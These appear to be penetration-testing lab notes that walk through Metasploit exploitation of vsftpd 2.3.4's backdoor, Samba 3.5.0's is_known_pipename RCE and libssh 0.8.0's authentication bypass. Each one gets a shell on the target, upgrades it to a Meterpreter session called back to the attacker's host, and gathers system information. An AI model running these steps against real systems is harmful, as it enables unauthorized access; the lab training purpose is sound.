# Exploiting a Vulnerable FTP Server

## FTP (File Transfer Protocol)

- **FTP**: A protocol used for transferring files between a server and its clients, typically operating on **TCP port 21**.
- **Use Cases**:
  - Facilitating file sharing between systems.
  - Transferring files to and from a web serverâ€™s directory.
- **vsftpd**: A popular FTP server for Unix-like systems, including Linux distributions such as Ubuntu, CentOS, and Fedora. It is the default FTP server for these systems.
- **Vulnerability**: **vsftpd V2.3.4** is vulnerable to a **Remote Command Execution (RCE)** vulnerability caused by a backdoor introduced into the vsftpd archive during a **supply chain attack**.

## Demo: Exploiting FTP

### Plan

We aim to exploit the **vsftpd V2.3.4** vulnerability to gain remote access to the FTP server. After identifying the FTP service and version through scanning, we will use a prebuilt Metasploit exploit module to exploit the backdoor vulnerability. Once we have a shell on the target, we will upgrade it to a **Meterpreter** session for post-exploitation.

### Step-by-Step Process

Start by checking the network interface configuration:

```bash
ifconfig
```

Start the Metasploit console and the PostgreSQL service:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the vsftpd attack:

```bash
workspace -a vsftpd2.3.4
```

Set the target IP globally for all subsequent commands:

```bash
setg rhosts [targetIP]
```

Check the workspace:

```bash
workspace
```

### Scanning and Enumeration

Perform an Nmap scan to identify open ports and services:

```bash
db_nmap -sS -sV -O [targetIP]
```

Check the services discovered during the scan:

```bash
services
```

Analyze the target system and services further:

```bash
analyze
```

### Exploit vsftpd Vulnerability

Search for the **vsftpd** exploit module in Metasploit:

```bash
search vsftpd
```

Use the **vsftpd 2.3.4 backdoor exploit** module:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

Show the available options and module information:

```bash
show options
```

Run the exploit to gain a shell:

```bash
run
```

Once we have a basic shell, upgrade to an interactive bash shell:

```bash
/bin/bash -i
```

### Upgrading to Meterpreter

Background the current shell session by pressing **CTRL + Z**.

Search for a module to upgrade the shell to a Meterpreter session:

```bash
search shell_to_meterpreter
```

Use the **shell_to_meterpreter** post-exploitation module:

```bash
use post/multi/manage/shell_to_meterpreter
```

Set the local host interface (replace `eth1` with the correct interface):

```bash
set lhost eth1
```

Set the current shell session (assuming the shell session ID is `1`):

```bash
set session 1
```

Run the module to upgrade the shell:

```bash
run
```

### Post-Exploitation

List all active sessions:

```bash
sessions
```

Select the Meterpreter session (replace `2` with the actual session ID):

```bash
sessions 2
```

Check the system information on the target:

```bash
sysinfo
```

Verify the user ID on the target system:

```bash
getuid
```

### Conclusion

What we accomplished:
- Exploited the **vsftpd 2.3.4** backdoor vulnerability.
- Obtained an initial shell on the target system.
- Upgraded the shell to a **Meterpreter session**.
- Performed post-exploitation steps to gather system information.


# Exploiting Samba

## Overview

- **SMB (Server Message Block)**: A network file sharing protocol used for sharing files and peripherals between computers on a local network (LAN).
- **Ports**: SMB typically runs on **TCP port 445**, although it originally operated over NetBIOS using **port 139**.
- **Samba**: The Linux implementation of SMB, enabling **Windows systems** to access **Linux shares** and devices.
- **Vulnerability**: **Samba V3.5.0** is vulnerable to a **Remote Code Execution (RCE)** vulnerability. A malicious client can upload a shared library to a writable share and cause the server to load and execute it, thus allowing arbitrary code execution.

## Demo: Exploiting Samba

### Plan

We will exploit a known vulnerability in **Samba V3.5.0**. After identifying the target system, we will use Metasploit's exploit module to exploit the vulnerability and obtain a shell on the target system. The shell will then be upgraded to a **Meterpreter session** for further post-exploitation actions.

### Step-by-Step Process

Check the network interface configuration:

```bash
ifconfig
```

Start the PostgreSQL service and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the Samba exploit:

```bash
workspace -a samba
```

Set the target IP address globally:

```bash
setg RHOSTS [targetIP]
```

### Scanning and Enumeration

Perform an Nmap scan to identify open ports and services on the target system:

```bash
db_nmap -sS -sV -O [targetIP]
```

### Exploiting Samba Vulnerability

Search for available **Samba exploit** modules in Metasploit:

```bash
search type:exploit name:samba
```

Use the **Samba "is_known_pipename" exploit** module:

```bash
use exploit/linux/samba/is_known_pipename
```

Check if the target is vulnerable:

```bash
check
```

Run the exploit to gain a shell on the target system:

```bash
run
```

### Post-Exploitation: Shell Commands

Once a shell session is established, interact with the target system:

- List files:

    ```bash
    ls
    ```

- Check the current working directory:

    ```bash
    pwd
    ```

Background the shell session with **CTRL + Z**.

List available sessions:

```bash
sessions
```

### Upgrading to Meterpreter

To upgrade the shell to a **Meterpreter session**, search for the **shell_to_meterpreter** module:

```bash
search shell_to_meterpreter
```

Use the **shell_to_meterpreter** post-exploitation module:

```bash
use post/multi/manage/shell_to_meterpreter
```

Set the local IP address:

```bash
set lhost [ownIP]
```

Set the current shell session ID (assumed to be `1` in this case):

```bash
set SESSION 1
```

Run the module to upgrade the shell:

```bash
run
```

### Post-Exploitation: Meterpreter Session

List all active sessions:

```bash
sessions
```

Interact with the Meterpreter session for further exploitation tasks.

### Conclusion

What we accomplished:
- Exploited the **Samba V3.5.0** vulnerability to gain access to the target system.
- Obtained an initial shell and executed basic commands on the target.
- Upgraded the shell to a **Meterpreter session** for further post-exploitation actions.

# Exploiting a Vulnerable SSH Server

## Overview

- **SSH (Secure Shell)**: A remote administration protocol providing encrypted communication, widely used for secure remote access to servers and systems.
- **Port**: By default, SSH uses **TCP port 22**, but it can be configured to use any open TCP port.
- **libssh**: A multiplatform **C library** that implements the **SSHv2 protocol** on both client and server sides.
- **Vulnerability**: **libssh V0.8.0** is vulnerable to an **authentication bypass** vulnerability that allows attackers to bypass SSH authentication and execute commands on the target server.

## Demo: Exploiting a Vulnerable SSH Server

### Plan

Our goal is to exploit the **libssh V0.8.0 authentication bypass vulnerability** to gain unauthorized access to the SSH server. After confirming the vulnerability, we will establish a shell session and upgrade it to a **Meterpreter session** for further post-exploitation tasks.

### Step-by-Step Process

Check the network interface configuration:

```bash
ifconfig
```

Start the PostgreSQL service and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the libssh exploit:

```bash
workspace -a libssh
```

Set the target IP address globally for all subsequent commands:

```bash
setg rhosts [targetIP]
```

### Scanning and Enumeration

Perform an Nmap scan to identify open ports and services:

```bash
db_nmap -sS -sV -O [targetIP]
```

Check the services discovered during the scan:

```bash
services
```

### Exploiting SSH Authentication Bypass

Search for the **libssh authentication bypass** module in Metasploit:

```bash
search libssh_auth_bypass
```

Use the **libssh authentication bypass** auxiliary module:

```bash
use auxiliary/scanner/libssh_auth_bypass
```

Show the available options:

```bash
show options
```

Enable pseudo-terminal (PTY) allocation for the shell session:

```bash
set SPAWN_PTY true
```

Run the exploit to gain access to the target system:

```bash
run
```

### Post-Exploitation: Shell Commands

Once a shell session is established, interact with the target system:

- List active sessions:

    ```bash
    sessions
    ```

- Switch to the shell session (assuming the session ID is `1`):

    ```bash
    sessions 1
    ```

- Check the current user:

    ```bash
    whoami
    ```

- Display the OS version:

    ```bash
    cat /etc/*release
    ```

- Check the kernel version:

    ```bash
    uname -r
    ```

Background the shell session with **CTRL + Z**.

### Upgrading to Meterpreter

To upgrade the shell to a **Meterpreter session**, search for the **shell_to_meterpreter** module:

```bash
search shell_to_meterpreter
```

Use the **shell_to_meterpreter** post-exploitation module:

```bash
use post/multi/manage/shell_to_meterpreter
```

Show the available options for the module:

```bash
show options
```

Set the local host interface (replace `eth1` with the correct interface):

```bash
set lhost eth1
```

Set the current shell session ID (assumed to be `1` in this case):

```bash
set SESSION 1
```

Run the module to upgrade the shell:

```bash
run
```

### Post-Exploitation: Meterpreter Session

Switch to the Meterpreter session and perform further post-exploitation actions:

```bash
sessions
```

- Get system information:

    ```bash
    sysinfo
    ```

### Conclusion

What we accomplished:
- Exploited the **libssh V0.8.0** authentication bypass vulnerability to gain unauthorized access to the SSH server.
- Established a shell session on the target system.
- Upgraded the shell to a **Meterpreter session** for further post-exploitation tasks.
